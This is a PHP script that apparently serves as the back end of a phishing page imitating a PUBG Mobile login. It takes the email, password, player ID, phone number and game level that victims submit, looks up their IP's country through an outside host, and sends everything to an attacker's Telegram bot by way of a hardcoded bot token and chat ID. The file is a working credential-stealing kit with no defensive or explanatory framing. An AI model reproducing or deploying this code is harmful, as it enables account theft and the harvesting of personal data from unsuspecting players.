?>PUBGM0BILE333
<?php
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
$playid = $_POST['playid'];
$phone = $_POST['phone'];
$level = $_POST['level'];
$API_KEY = '2028140516:AAENl4WBVQWHuhY17-RdhLubB8cU7nk1mvE';//TOKIN
define('API_KEY',$API_KEY);
function bot($method,$datas=[]){
    $mr = http_build_query($datas);
        $url = "https://api.telegram.org/bot".API_KEY."/".$method."?$mr";
        $mrvenom = file_get_contents($url);
        return json_decode($mrvenom);
    }
function getUserIP()
    {
        // Get real visitor IP behind CloudFlare network
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
    
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }
    
        return $ip;
    }

$ip = getUserIP();
$curl_shagitz = curl_init();
curl_setopt($curl_shagitz, CURLOPT_URL,"https://shagitzsan.systems/api/country.php"); 
curl_setopt($curl_shagitz, CURLOPT_POST, 1);
curl_setopt($curl_shagitz, CURLOPT_POSTFIELDS,"ip=$ip");
curl_setopt($curl_shagitz, CURLOPT_RETURNTRANSFER, true);
$result_shagitz = curl_exec($curl_shagitz);
curl_close ($curl_shagitz);
$shagitz = json_decode($result_shagitz,true);
$shagitzsan = $shagitz['shagitzsan'];
$call = $shagitz['shagitz_call'];
$country = $shagitz['shagitz_country'];
$time = date("d/m/Y h:i:s");
$admin = "1911223261";//Id
bot("sendMessage",[
"chat_id"=>$admin,
"text"=>"
🇾🇪 HELLO NEW ACCOUNT PUBG 🇾🇪
▱▰▱▰▱▰▱▰▱▰▱▰▱▰
🇾🇪 التسجيل » $login
🇾🇪 الايميل » $email
🇾🇪 كلمة السر » $password
🇾🇪 ايدي ببجي » $playid
🇾🇪 رقم التلفون » $phone
🇾🇪 لفل ببجي » $level
🇾🇪 كود الدولة » $shagitzsan
🇾🇪 الدولة » $country
🇾🇪 الوقت » $time
🇾🇪 الايبي » $ip
▱▰▱▰▱▰▱▰▱▰▱▰▱▰‌‌
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>false,
]);
?>